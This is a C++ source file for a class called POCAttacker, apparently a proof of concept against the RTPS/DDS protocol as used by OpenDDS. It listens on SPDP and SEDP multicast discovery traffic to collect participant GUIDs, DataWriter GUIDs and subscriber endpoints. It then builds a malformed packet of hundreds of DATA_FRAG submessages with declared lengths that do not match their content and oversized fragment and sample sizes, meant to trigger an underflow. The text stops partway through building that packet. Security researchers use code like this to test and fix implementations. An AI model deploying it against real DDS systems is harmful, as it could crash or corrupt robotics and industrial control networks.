/*
 * Distributed under the OpenDDS License.
 * See: http://www.opendds.org/license.html
 */

#include "POCAttacker.h"
#include <dds/DCPS/GuidUtils.h>
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <thread>
#include <chrono>
#include <cerrno>
#include <iomanip>
#include <sstream>

POCAttacker::POCAttacker()
  : listener_socket_(-1)
  , sedp_listener_socket_(-1)
  , listener_running_(false)
  , sedp_listener_running_(false)
  , discovered_subscriber_port_(0)
{
  // Initialize local GUID prefix (simplified)
  std::memset(local_guid_prefix_.guidPrefix, 0, sizeof(local_guid_prefix_.guidPrefix));
  local_guid_prefix_.guidPrefix[0] = 0x01;
}

POCAttacker::~POCAttacker()
{
  stopGUIDListener();
  stopSEDPListener();
}

bool POCAttacker::startGUIDListener(int port, const char* multicast_addr)
{
  if (listener_running_) {
    return true;
  }

  listener_socket_ = socket(AF_INET, SOCK_DGRAM, 0);
  if (listener_socket_ < 0) {
    std::cerr << "Failed to create socket: " << strerror(errno) << std::endl;
    return false;
  }

  // Set socket options
  int opt = 1;
  setsockopt(listener_socket_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
  setsockopt(listener_socket_, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));

  // Bind to port
  struct sockaddr_in addr;
  std::memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = INADDR_ANY;
  addr.sin_port = htons(port);

  if (bind(listener_socket_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
    std::cerr << "Failed to bind to port " << port << ": " << strerror(errno) << std::endl;
    close(listener_socket_);
    listener_socket_ = -1;
    return false;
  }

  // Join multicast group to receive SPDP discovery messages
  if (multicast_addr) {
    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr(multicast_addr);
    mreq.imr_interface.s_addr = INADDR_ANY;
    
    if (setsockopt(listener_socket_, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0) {
      std::cerr << "Failed to join multicast group " << multicast_addr 
                << ": " << strerror(errno) << std::endl;
      close(listener_socket_);
      listener_socket_ = -1;
      return false;
    }
    std::cout << "SPDP Listener: Joined multicast group " << multicast_addr << ":" << port << std::endl;
  }

  listener_running_ = true;
  std::cout << "SPDP Listener: Started on port " << port << std::endl;

  // Start listening thread
  std::thread listener_thread([this]() {
    char buffer[65536];
    struct sockaddr_in remote_addr;
    socklen_t addr_len = sizeof(remote_addr);

    while (listener_running_) {
      ssize_t recv_len = recvfrom(listener_socket_, buffer, sizeof(buffer), 0,
                                  (struct sockaddr*)&remote_addr, &addr_len);
      
      if (recv_len > 0 && recv_len >= 20) {
        // Check for RTPS magic
        if (std::memcmp(buffer, "RTPS", 4) == 0) {
          // Extract Participant GUID from RTPS header
          OpenDDS::DCPS::GUID_t participant_guid;
          if (extractParticipantGUIDFromHeader(buffer, recv_len, participant_guid)) {
            // Check if we already have this GUID
            bool found = false;
            for (const auto& g : discovered_participant_guids_) {
              if (std::memcmp(&g, &participant_guid, sizeof(participant_guid)) == 0) {
                found = true;
                break;
              }
            }
            if (!found) {
              discovered_participant_guids_.push_back(participant_guid);
              std::cout << "SPDP Listener: Discovered Participant GUID: " 
                        << guidToString(participant_guid) << std::endl;
            }
          }
          
          // Also try to extract Subscriber endpoint from SPDP message
          // (SPDP may contain locator information for data transmission)
          std::cout << "SPDP Listener: Received SPDP message, length=" << recv_len << std::endl;
          extractSubscriberEndpointFromSPDP(buffer, recv_len);
        }
      }
    }
  });

  listener_thread.detach();
  return true;
}

void POCAttacker::stopGUIDListener()
{
  if (listener_running_) {
    listener_running_ = false;
    if (listener_socket_ >= 0) {
      close(listener_socket_);
      listener_socket_ = -1;
    }
  }
}

bool POCAttacker::startSEDPListener(int port, const char* multicast_addr)
{
  if (sedp_listener_running_) {
    return true;
  }

  sedp_listener_socket_ = socket(AF_INET, SOCK_DGRAM, 0);
  if (sedp_listener_socket_ < 0) {
    std::cerr << "Failed to create SEDP socket: " << strerror(errno) << std::endl;
    return false;
  }

  // Set socket options
  int opt = 1;
  setsockopt(sedp_listener_socket_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
  setsockopt(sedp_listener_socket_, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));

  // Bind to port
  struct sockaddr_in addr;
  std::memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = INADDR_ANY;
  addr.sin_port = htons(port);

  if (bind(sedp_listener_socket_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
    std::cerr << "Failed to bind to SEDP port " << port << ": " << strerror(errno) << std::endl;
    close(sedp_listener_socket_);
    sedp_listener_socket_ = -1;
    return false;
  }

  // Join multicast group to receive SEDP discovery messages
  if (multicast_addr) {
    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr(multicast_addr);
    mreq.imr_interface.s_addr = INADDR_ANY;
    
    if (setsockopt(sedp_listener_socket_, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0) {
      std::cerr << "Failed to join multicast group " << multicast_addr 
                << ": " << strerror(errno) << std::endl;
      close(sedp_listener_socket_);
      sedp_listener_socket_ = -1;
      return false;
    }
    std::cout << "SEDP Listener: Joined multicast group " << multicast_addr << ":" << port << std::endl;
  }

  sedp_listener_running_ = true;
  std::cout << "SEDP Listener: Started on port " << port << std::endl;

  // Start listening thread
  std::thread sedp_listener_thread([this]() {
    char buffer[65536];
    struct sockaddr_in remote_addr;
    socklen_t addr_len = sizeof(remote_addr);

    while (sedp_listener_running_) {
      ssize_t recv_len = recvfrom(sedp_listener_socket_, buffer, sizeof(buffer), 0,
                                  (struct sockaddr*)&remote_addr, &addr_len);
      
      if (recv_len > 0 && recv_len >= 20) {
        // Check for RTPS magic
        if (std::memcmp(buffer, "RTPS", 4) == 0) {
          // Extract DataWriter GUIDs from SEDP messages
          std::vector<OpenDDS::DCPS::GUID_t> writer_guids;
          if (extractDataWriterGUIDsFromSEDP(buffer, recv_len, writer_guids)) {
            for (const auto& guid : writer_guids) {
              // Check if we already have this GUID
              bool found = false;
              for (const auto& g : discovered_writer_guids_) {
                if (std::memcmp(&g, &guid, sizeof(guid)) == 0) {
                  found = true;
                  break;
                }
              }
              if (!found) {
                discovered_writer_guids_.push_back(guid);
                std::cout << "SEDP Listener: Discovered DataWriter GUID (Publisher): " 
                          << guidToString(guid) << std::endl;
              }
            }
          }
          
          // Extract Subscriber endpoint (address and port) from SEDP messages
          std::cout << "SEDP Listener: Received SEDP message, length=" << recv_len << std::endl;
          extractSubscriberEndpointFromSEDP(buffer, recv_len);
        }
      }
    }
  });

  sedp_listener_thread.detach();
  return true;
}

void POCAttacker::stopSEDPListener()
{
  if (sedp_listener_running_) {
    sedp_listener_running_ = false;
    if (sedp_listener_socket_ >= 0) {
      close(sedp_listener_socket_);
      sedp_listener_socket_ = -1;
    }
  }
}

bool POCAttacker::extractParticipantGUIDFromHeader(const char* data, size_t len, OpenDDS::DCPS::GUID_t& guid)
{
  if (len < 20) {
    return false;
  }

  // RTPS Header is 20 bytes: 4 (magic) + 2 (version) + 2 (vendor) + 12 (guidPrefix)
  std::memcpy(guid.guidPrefix, data + 8, 12);
  guid.entityId.entityKey[0] = 0;
  guid.entityId.entityKey[1] = 0;
  guid.entityId.entityKey[2] = 0;
  guid.entityId.entityKind = 0xC1; // Built-in participant

  return true;
}

bool POCAttacker::extractDataWriterGUIDsFromSEDP(const char* data, size_t len, std::vector<OpenDDS::DCPS::GUID_t>& writer_guids)
{
  if (len < 20) {
    return false;
  }

  // Extract Participant GUID prefix from RTPS header
  OpenDDS::DCPS::GuidPrefix_t participant_prefix;
  std::memcpy(participant_prefix, data + 8, 12);

  // Parse submessages (start after 20-byte header)
  size_t offset = 20;
  
  while (offset + 4 <= len) {
    // Read submessage ID and flags
    unsigned char submessage_id = static_cast<unsigned char>(data[offset]);
    unsigned char flags = static_cast<unsigned char>(data[offset + 1]);
    
    // Read submessage length (little endian, 2 bytes)
    uint16_t submessage_length = 0;
    if (offset + 4 <= len) {
      submessage_length = static_cast<unsigned char>(data[offset + 2]) |
                         (static_cast<unsigned char>(data[offset + 3]) << 8);
    }

    // Check for DATA (0x15) or DATA_FRAG (0x16) submessages
    // These contain DataWriter GUIDs
    if (submessage_id == 0x15 || submessage_id == 0x16) {
      // DATA/DATA_FRAG submessage structure:
      // - Submessage header (4 bytes): ID, flags, length
      // - Extra flags (2 bytes) - only if X flag is set
      // - Octets to inline QoS (2 bytes)
      // - Reader Entity ID (4 bytes)
      // - Writer Entity ID (4 bytes) - this is what we need
      
      size_t submessage_start = offset;
      size_t data_offset = offset + 4; // After submessage header
      
      // Check if X flag is set (extra flags present)
      bool has_extra_flags = (flags & 0x01) != 0;
      if (has_extra_flags) {
        data_offset += 2; // Skip extra flags
      }
      
      // Skip octets to inline QoS (2 bytes)
      data_offset += 2;
      
      // Now we should be at Reader Entity ID
      // Writer Entity ID comes after Reader Entity ID (4 bytes)
      size_t writer_entity_offset = data_offset + 4;
      
      if (writer_entity_offset + 4 <= len && writer_entity_offset >= submessage_start) {
        OpenDDS::DCPS::GUID_t writer_guid;
        std::memcpy(writer_guid.guidPrefix, participant_prefix, 12);
        
        // Extract Writer Entity ID
        writer_guid.entityId.entityKey[0] = static_cast<unsigned char>(data[writer_entity_offset]);
        writer_guid.entityId.entityKey[1] = static_cast<unsigned char>(data[writer_entity_offset + 1]);
        writer_guid.entityId.entityKey[2] = static_cast<unsigned char>(data[writer_entity_offset + 2]);
        writer_guid.entityId.entityKind = static_cast<unsigned char>(data[writer_entity_offset + 3]);
        
        // Check if this is a DataWriter (entityKind should be 0x03 for DataWriter)
        // or check if it's not a built-in entity (entityKind < 0xC0)
        // DataWriter entityKind is typically 0x03, but we accept any non-built-in entity
        if (writer_guid.entityId.entityKind < 0xC0 && writer_guid.entityId.entityKind != 0) {
          // Check if we already have this GUID
          bool found = false;
          for (const auto& g : writer_guids) {
            if (std::memcmp(&g, &writer_guid, sizeof(writer_guid)) == 0) {
              found = true;
              break;
            }
          }
          if (!found) {
            writer_guids.push_back(writer_guid);
          }
        }
      }
    }
    
    // Move to next submessage
    if (submessage_length == 0) {
      break; // Invalid length
    }
    
    offset += 4 + submessage_length;
    
    // Align to 4-byte boundary
    offset = (offset + 3) & ~3;
    
    if (offset >= len) {
      break;
    }
  }

  return !writer_guids.empty();
}

void POCAttacker::extractSubscriberEndpointFromSEDP(const char* data, size_t len)
{
  if (len < 20) {
    return; // Invalid data
  }

  // Parse submessages (start after 20-byte header)
  size_t offset = 20;
  
  while (offset + 4 <= len) {
    // Read submessage ID and flags
    unsigned char submessage_id = static_cast<unsigned char>(data[offset]);
    unsigned char flags = static_cast<unsigned char>(data[offset + 1]);
    
    // Read submessage length (little endian, 2 bytes)
    uint16_t submessage_length = 0;
    if (offset + 4 <= len) {
      submessage_length = static_cast<unsigned char>(data[offset + 2]) |
                         (static_cast<unsigned char>(data[offset + 3]) << 8);
    }
    
    // If length is 0, it means the submessage extends to the end of the message
    if (submessage_length == 0 && offset + 4 < len) {
      submessage_length = len - offset - 4;  // Subtract submessage header (4 bytes)
      std::cout << "SEDP Listener: length=0, calculated length=" << submessage_length << " from message end" << std::endl;
    }

    // Check for DATA (0x15) submessage - check ALL DATA submessages, not just DataReader
    if (submessage_id == 0x15) {
      std::cout << "SEDP Listener: Found DATA submessage at offset " << offset 
                << ", length=" << submessage_length << std::endl;
      size_t submessage_start = offset;
      size_t data_offset = offset + 4; // After submessage header
      
      // Check if X flag is set (extra flags present)
      bool has_extra_flags = (flags & 0x01) != 0;
      if (has_extra_flags) {
        data_offset += 2; // Skip extra flags
      }
      
      // Read octets to inline QoS (2 bytes, little endian)
      uint16_t octets_to_inline_qos = 0;
      if (data_offset + 2 <= len) {
        octets_to_inline_qos = static_cast<unsigned char>(data[data_offset]) |
                              (static_cast<unsigned char>(data[data_offset + 1]) << 8);
        data_offset += 2;
      }
      std::cout << "SEDP Listener: octets_to_inline_qos=" << octets_to_inline_qos << std::endl;
      
      // Reader Entity ID (4 bytes)
      if (data_offset + 4 <= len) {
        unsigned char entity_kind = static_cast<unsigned char>(data[data_offset + 3]);
        std::cout << "SEDP Listener: entity_kind=0x" << std::hex << (int)entity_kind << std::dec << std::endl;
        
        // Save Reader Entity ID position for inline QoS calculation
        size_t reader_entity_id_pos = data_offset;
        
        // Skip Reader Entity ID (4 bytes), Writer Entity ID (4 bytes), and Writer SN (8 bytes)
        data_offset += 4 + 4 + 8;
        
        // Inline QoS starts after octets_to_inline_qos bytes from Reader Entity ID
        // octets_to_inline_qos includes Reader Entity ID, Writer Entity ID, Writer SN, and SerializedData
        size_t inline_qos_start = reader_entity_id_pos + octets_to_inline_qos;
        std::cout << "SEDP Listener: reader_entity_id_pos=" << reader_entity_id_pos 
                  << ", inline_qos_start=" << inline_qos_start << ", len=" << len << std::endl;
        
        if (inline_qos_start < len) {
          size_t qos_offset = inline_qos_start;
          std::cout << "SEDP Listener: Starting to parse inline QoS at offset " << qos_offset 
                    << " (0x" << std::hex << qos_offset << std::dec << ")" << std::endl;
          
          // Inline QoS format: encap kind (2 bytes) + encap options (2 bytes) + parameter list
          if (qos_offset + 4 <= len) {
            // Read encap kind (2 bytes, little endian)
            uint16_t encap_kind = static_cast<unsigned char>(data[qos_offset]) |
                                 (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
            qos_offset += 2;
            
            // Read encap options (2 bytes, little endian)
            uint16_t encap_options = static_cast<unsigned char>(data[qos_offset]) |
                                     (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
            qos_offset += 2;
            
            std::cout << "SEDP Listener: QoS encap_kind=0x" << std::hex << encap_kind 
                      << ", encap_options=0x" << encap_options << std::dec << std::endl;
            std::cout << "SEDP Listener: Parameter list starts at offset " << qos_offset 
                      << " (0x" << std::hex << qos_offset << std::dec << ")" << std::endl;
          }
          
          // Now parse parameter list
          while (qos_offset + 4 <= len && qos_offset < submessage_start + 4 + submessage_length) {
            // Read Parameter ID (2 bytes, little endian)
            uint16_t param_id = static_cast<unsigned char>(data[qos_offset]) |
                               (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
            qos_offset += 2;
            
            // PID_SENTINEL (0x0001) marks end of parameters
            if (param_id == 0x0001) {
              std::cout << "SEDP Listener: Found PID_SENTINEL, end of parameters" << std::endl;
              break;
            }
            
            // Read Parameter length (2 bytes, little endian)
            uint16_t param_length = 0;
            if (qos_offset + 2 <= len) {
              param_length = static_cast<unsigned char>(data[qos_offset]) |
                            (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
              qos_offset += 2;
            }
            std::cout << "SEDP Listener: Found parameter 0x" << std::hex << param_id << std::dec 
                      << ", length=" << param_length << " at offset " << (qos_offset - 4) 
                      << " (0x" << std::hex << (qos_offset - 4) << std::dec << ")" << std::endl;
            
            // Check for locator parameters (24 bytes = locator size)
            // PID_MULTICAST_LOCATOR (0x0031), PID_UNICAST_LOCATOR (0x002F),
            // PID_DEFAULT_MULTICAST_LOCATOR (0x0030)
            if (param_length == 24 && (param_id == 0x0030 || param_id == 0x002f || param_id == 0x0031)) {
              if (qos_offset + 24 <= len) {
                size_t locator_start = qos_offset;
                
                // Debug: print locator raw data
                std::cout << "SEDP Listener: Locator raw data (24 bytes) at offset " << locator_start << ": ";
                for (size_t i = 0; i < 24 && (locator_start + i) < len; ++i) {
                  std::cout << std::hex << std::setw(2) << std::setfill('0') 
                            << (int)(unsigned char)data[locator_start + i] << " ";
                }
                std::cout << std::dec << std::endl;
                
                // Skip kind (4 bytes)
                qos_offset += 4;
                
                // Read port (4 bytes, but only lower 2 bytes are used, little endian)
                uint16_t port = static_cast<unsigned char>(data[qos_offset]) |
                               (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
                std::cout << "SEDP Listener: Port bytes at offset " << qos_offset << ": " << std::hex 
                          << (int)(unsigned char)data[qos_offset] << " " 
                          << (int)(unsigned char)data[qos_offset + 1] << std::dec 
                          << ", port=" << port << std::endl;
                qos_offset += 4;
                
                // Read IP address (16 bytes, IPv4 uses last 4 bytes for IPv4 address)
                // Address in RTPS is stored in network byte order (big endian)
                // Read directly as network byte order using memcpy
                struct in_addr addr_first, addr_last;
                memcpy(&addr_first.s_addr, data + qos_offset, 4);
                memcpy(&addr_last.s_addr, data + qos_offset + 12, 4);
                
                std::cout << "SEDP Listener: Address first 4 bytes at offset " << qos_offset << ": " << std::hex
                          << (int)(unsigned char)data[qos_offset] << " "
                          << (int)(unsigned char)data[qos_offset + 1] << " "
                          << (int)(unsigned char)data[qos_offset + 2] << " "
                          << (int)(unsigned char)data[qos_offset + 3] << std::dec
                          << " (0x" << std::hex << ntohl(addr_first.s_addr) << std::dec << ")" << std::endl;
                std::cout << "SEDP Listener: Address last 4 bytes at offset " << (qos_offset + 12) << ": " << std::hex
                          << (int)(unsigned char)data[qos_offset + 12] << " "
                          << (int)(unsigned char)data[qos_offset + 13] << " "
                          << (int)(unsigned char)data[qos_offset + 14] << " "
                          << (int)(unsigned char)data[qos_offset + 15] << std::dec
                          << " (0x" << std::hex << ntohl(addr_last.s_addr) << std::dec << ")" << std::endl;
                
                // Use the non-zero address (IPv4 address is typically in last 4 bytes)
                struct in_addr addr;
                if (addr_last.s_addr != 0) {
                  addr.s_addr = addr_last.s_addr;
                } else {
                  addr.s_addr = addr_first.s_addr;
                }
                
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &addr, ip_str, INET_ADDRSTRLEN);
                
                if (port > 0) {
                  std::cout << "SEDP Listener: Found locator param 0x" << std::hex << param_id << std::dec
                            << " with endpoint " << ip_str << ":" << port << std::endl;
                  
                  if (discovered_subscriber_port_ == 0) {
                    discovered_subscriber_port_ = port;
                    discovered_subscriber_address_ = std::string(ip_str);
                    std::cout << "SEDP Listener: Discovered Subscriber endpoint: " 
                              << ip_str << ":" << port << " (from param 0x" 
                              << std::hex << param_id << std::dec << ")" << std::endl;
                  } else if (std::string(ip_str) == "239.255.0.2") {
                    // Update to 239.255.0.2 if found (this is the data transmission address)
                    discovered_subscriber_port_ = port;
                    discovered_subscriber_address_ = std::string(ip_str);
                    std::cout << "SEDP Listener: Updated Subscriber endpoint to: " 
                              << ip_str << ":" << port << " (from param 0x" 
                              << std::hex << param_id << std::dec << ")" << std::endl;
                    return; // Found the data transmission endpoint
                  }
                }
                // Skip the rest of locator data (already read port and address)
                qos_offset += 12; // Skip remaining 12 bytes of address
              }
            } else {
              // Skip parameter data (not a locator we're interested in)
              if (param_length > 0 && qos_offset + param_length <= len) {
                qos_offset += param_length;
              }
            }
            
            // Move to next parameter (align to 4-byte boundary)
            qos_offset = (qos_offset + 3) & ~3; // Align to 4 bytes
          }
        }
      }
    }
    
    // Move to next submessage
    // Note: length=0 is already handled above (extends to message end)
    if (submessage_length == 0 && offset + 4 >= len) {
      std::cout << "SEDP Listener: No more data, breaking" << std::endl;
      break; // No more data
    }
    
    offset += 4 + submessage_length;
    
    // Align to 4-byte boundary
    offset = (offset + 3) & ~3;
    
    if (offset >= len) {
      break;
    }
  }
  std::cout << "SEDP Listener: Finished parsing SEDP message, total offset=" << offset << ", len=" << len << std::endl;
}

void POCAttacker::extractSubscriberEndpointFromSPDP(const char* data, size_t len)
{
  if (len < 20) {
    return; // Invalid data
  }

  // Parse submessages (start after 20-byte header)
  size_t offset = 20;
  
  while (offset + 4 <= len) {
    // Read submessage ID and flags
    unsigned char submessage_id = static_cast<unsigned char>(data[offset]);
    unsigned char flags = static_cast<unsigned char>(data[offset + 1]);
    
    // Read submessage length (little endian, 2 bytes)
    uint16_t submessage_length = 0;
    if (offset + 4 <= len) {
      submessage_length = static_cast<unsigned char>(data[offset + 2]) |
                         (static_cast<unsigned char>(data[offset + 3]) << 8);
    }
    
    // If length is 0, it means the submessage extends to the end of the message
    if (submessage_length == 0 && offset + 4 < len) {
      submessage_length = len - offset - 4;  // Subtract submessage header (4 bytes)
      std::cout << "SPDP Listener: length=0, calculated length=" << submessage_length << " from message end" << std::endl;
    }

    // Check for DATA (0x15) submessage containing Participant information
    if (submessage_id == 0x15) {
      size_t submessage_start = offset;
      size_t data_offset = offset + 4; // After submessage header
      
      // Check if X flag is set (extra flags present)
      bool has_extra_flags = (flags & 0x01) != 0;
      if (has_extra_flags) {
        data_offset += 2; // Skip extra flags
      }
      
      // Read octets to inline QoS (2 bytes, little endian)
      uint16_t octets_to_inline_qos = 0;
      if (data_offset + 2 <= len) {
        octets_to_inline_qos = static_cast<unsigned char>(data[data_offset]) |
                              (static_cast<unsigned char>(data[data_offset + 1]) << 8);
        data_offset += 2;
      }
      
      // Save Reader Entity ID position for inline QoS calculation
      size_t reader_entity_id_pos = data_offset;
      
      // Skip Reader Entity ID and Writer Entity ID (8 bytes total)
      data_offset += 8;
      
      // Skip Writer SN (8 bytes)
      data_offset += 8;
      
      // Inline QoS starts after octets_to_inline_qos bytes from Reader Entity ID
      // octets_to_inline_qos includes Reader Entity ID, Writer Entity ID, Writer SN, and SerializedData
      size_t inline_qos_start = reader_entity_id_pos + octets_to_inline_qos;
      
        if (inline_qos_start < len) {
          size_t qos_offset = inline_qos_start;
          
          // Inline QoS format: encap kind (2 bytes) + encap options (2 bytes) + parameter list
          if (qos_offset + 4 <= len) {
            // Read encap kind (2 bytes, little endian)
            uint16_t encap_kind = static_cast<unsigned char>(data[qos_offset]) |
                                 (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
            qos_offset += 2;
            
            // Read encap options (2 bytes, little endian)
            uint16_t encap_options = static_cast<unsigned char>(data[qos_offset]) |
                                     (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
            qos_offset += 2;
            
            std::cout << "SPDP Listener: QoS encap_kind=0x" << std::hex << encap_kind 
                      << ", encap_options=0x" << encap_options << std::dec << std::endl;
            std::cout << "SPDP Listener: Parameter list starts at offset " << qos_offset << std::endl;
          }
          
          // Now parse parameter list
          while (qos_offset + 4 <= len && qos_offset < submessage_start + 4 + submessage_length) {
          // Read Parameter ID (2 bytes, little endian)
          uint16_t param_id = static_cast<unsigned char>(data[qos_offset]) |
                             (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
          qos_offset += 2;
          
          // PID_SENTINEL (0x0001) marks end of parameters
          if (param_id == 0x0001) {
            break;
          }
          
          // Read Parameter length (2 bytes, little endian)
          uint16_t param_length = 0;
          if (qos_offset + 2 <= len) {
            param_length = static_cast<unsigned char>(data[qos_offset]) |
                          (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
            qos_offset += 2;
          }
          
          // Check for locator parameters (24 bytes = locator size)
          // PID_MULTICAST_LOCATOR (0x0031), PID_UNICAST_LOCATOR (0x002F),
          // PID_DEFAULT_MULTICAST_LOCATOR (0x0030)
          if (param_length == 24 && (param_id == 0x0030 || param_id == 0x002f || param_id == 0x0031)) {
            if (qos_offset + 24 <= len) {
              size_t locator_start = qos_offset;
              
              // Skip kind (4 bytes)
              qos_offset += 4;
              
              // Read port (4 bytes, but only lower 2 bytes are used, little endian)
              uint16_t port = static_cast<unsigned char>(data[qos_offset]) |
                             (static_cast<unsigned char>(data[qos_offset + 1]) << 8);
              qos_offset += 4;
              
              // Read IP address (16 bytes, IPv4 uses last 4 bytes for IPv4 address)
              // Address in RTPS is stored in network byte order (big endian)
              // Read directly as network byte order using memcpy
              struct in_addr addr_first, addr_last;
              memcpy(&addr_first.s_addr, data + qos_offset, 4);
              memcpy(&addr_last.s_addr, data + qos_offset + 12, 4);
              
              // Use the non-zero address (IPv4 address is typically in last 4 bytes)
              struct in_addr addr;
              if (addr_last.s_addr != 0) {
                addr.s_addr = addr_last.s_addr;
              } else {
                addr.s_addr = addr_first.s_addr;
              }
              
              char ip_str[INET_ADDRSTRLEN];
              inet_ntop(AF_INET, &addr, ip_str, INET_ADDRSTRLEN);
                
                if (port > 0) {
                  std::cout << "SPDP Listener: Found locator param 0x" << std::hex << param_id << std::dec
                            << " with endpoint " << ip_str << ":" << port << std::endl;
                  
                  if (discovered_subscriber_port_ == 0) {
                    discovered_subscriber_port_ = port;
                    discovered_subscriber_address_ = std::string(ip_str);
                    std::cout << "SPDP Listener: Discovered Subscriber endpoint: " 
                              << ip_str << ":" << port << " (from locator param 0x" 
                              << std::hex << param_id << std::dec << ")" << std::endl;
                  } else if (std::string(ip_str) == "239.255.0.2") {
                    // Update to 239.255.0.2 if found (this is the data transmission address)
                    discovered_subscriber_port_ = port;
                    discovered_subscriber_address_ = std::string(ip_str);
                    std::cout << "SPDP Listener: Updated Subscriber endpoint to: " 
                              << ip_str << ":" << port << " (from locator param 0x" 
                              << std::hex << param_id << std::dec << ")" << std::endl;
                  }
                }
                // Skip the rest of locator data (already read port and address)
                qos_offset += 12; // Skip remaining 12 bytes of address
              }
            } else {
              // Skip parameter data (not a locator we're interested in)
              if (param_length > 0 && qos_offset + param_length <= len) {
                qos_offset += param_length;
              }
            }
            
            // Move to next parameter (align to 4-byte boundary)
            qos_offset = (qos_offset + 3) & ~3; // Align to 4 bytes
        }
      }
    }
    
    // Move to next submessage
    // Note: length=0 is already handled above (extends to message end)
    if (submessage_length == 0 && offset + 4 >= len) {
      std::cout << "SPDP Listener: No more data, breaking" << std::endl;
      break; // No more data
    }
    
    offset += 4 + submessage_length;
    
    // Align to 4-byte boundary
    offset = (offset + 3) & ~3;
    
    if (offset >= len) {
      break;
    }
  }
  std::cout << "SPDP Listener: Finished parsing SPDP message, total offset=" << offset << ", len=" << len << std::endl;
}

std::string POCAttacker::guidToString(const OpenDDS::DCPS::GUID_t& guid)
{
  std::ostringstream oss;
  oss << std::hex << std::setfill('0');
  
  // Print GUID prefix
  for (size_t i = 0; i < 12; ++i) {
    oss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(guid.guidPrefix[i]));
  }
  
  oss << ".";
  
  // Print Entity ID
  oss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(guid.entityId.entityKey[0]));
  oss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(guid.entityId.entityKey[1]));
  oss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(guid.entityId.entityKey[2]));
  oss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(guid.entityId.entityKind));
  
  return oss.str();
}

void POCAttacker::generateUTCTimestamp(char* timestamp)
{
  // Generate current UTC timestamp (simplified)
  std::memset(timestamp, 0, 8);
  // In real implementation, would use actual timestamp
}

void POCAttacker::generateRTPSHeader(std::vector<char>& rtps_message, const OpenDDS::DCPS::GUID_t* target_guid)
{
  // RTPS Magic
  rtps_message.push_back('R');
  rtps_message.push_back('T');
  rtps_message.push_back('P');
  rtps_message.push_back('S');

  // Protocol Version (2.1)
  rtps_message.push_back(0x02);
  rtps_message.push_back(0x01);

  // Vendor ID (OpenDDS)
  rtps_message.push_back(0x01);
  rtps_message.push_back(0x03);

  // GUID Prefix
  if (target_guid) {
    for (int i = 0; i < 12; ++i) {
      rtps_message.push_back(target_guid->guidPrefix[i]);
    }
  } else {
    for (int i = 0; i < 12; ++i) {
      rtps_message.push_back(local_guid_prefix_.guidPrefix[i]);
    }
  }
}

std::vector<char> POCAttacker::generateDataFragUnderflowPacket(int seq_num, const OpenDDS::DCPS::GUID_t* target_guid)
{
  std::vector<char> rtps_message;
  
  // Generate RTPS Header
  generateRTPSHeader(rtps_message, target_guid);

  // Generate UTC timestamp
  char timestamp[8];
  generateUTCTimestamp(timestamp);

  // INFO_TS submessage
  rtps_message.push_back(0x09); // INFO_TS
  rtps_message.push_back(0x01); // Flags
  rtps_message.push_back(0x08); // Length low
  rtps_message.push_back(0x00); // Length high
  for (int i = 0; i < 8; ++i) {
    rtps_message.push_back(timestamp[i]);
  }

  // Generate multiple DATA_FRAG submessages (0x330 = 816)
  for (int i = 0; i < 0x330; ++i) {
    // Submessage ID
    rtps_message.push_back(0x16); // DATA_FRAG

    // Flags
    rtps_message.push_back(0x03); // endianness + inline QoS flag

    // Length (declared as 36 bytes, but actual data is much larger)
    rtps_message.push_back(0x24); // Length low byte
    rtps_message.push_back(0x00); // Length high byte

    // Extra flags
    rtps_message.push_back(0x00);
    rtps_message.push_back(0x00);

    // Octets to inline QoS
    rtps_message.push_back(0x1c); // 28 bytes
    rtps_message.push_back(0x00);

    // Reader Entity ID
    rtps_message.push_back(0x00);
    rtps_message.push_back(0x00);
    rtps_message.push_back(0x01);
    rtps_message.push_back(0x04);

    // Writer Entity ID
    rtps_message.push_back(0x00);
    rtps_message.push_back(0x00);
    rtps_message.push_back(0x01);
    rtps_message.push_back(0x03);

    // Sequence Number (8 bytes, little endian)
    uint32_t seq = 10000000 + seq_num;
    for (int j = 0; j < 4; ++j) {
      rtps_message.push_back(0x00); // high 4 bytes
    }
    for (int j = 0; j < 4; ++j) {
      rtps_message.push_back(static_cast<char>((seq >> (j * 8)) & 0xFF));
    }

    // Fragment Number (4 bytes, little endian)
    uint32_t frag_num = 1 + i;
    for (int j = 0; j < 4; ++j) {
      rtps_message.push_back(static_cast<char>((frag_num >> (j * 8)) & 0xFF));
    }

    // Fragments in Submessage (2 bytes, little endian)
    uint16_t frags_in_submsg = 0x330;
    rtps_message.push_back(static_cast<char>(frags_in_submsg & 0xFF));
    rtps_message.push_back(static_cast<char>((frags_in_submsg >> 8) & 0xFF));

    // Fragment Size (2 bytes, little endian)
    uint16_t frag_size = 0xffff;
    rtps_message.push_back(static_cast<char>(frag_size & 0xFF));
    rtps_message.push_back(static_cast<char>((frag_size >> 8) & 0xFF));

    // Sample Size (4 bytes, little endian)
    uint32_t sample_size = 0x32FFCD0;
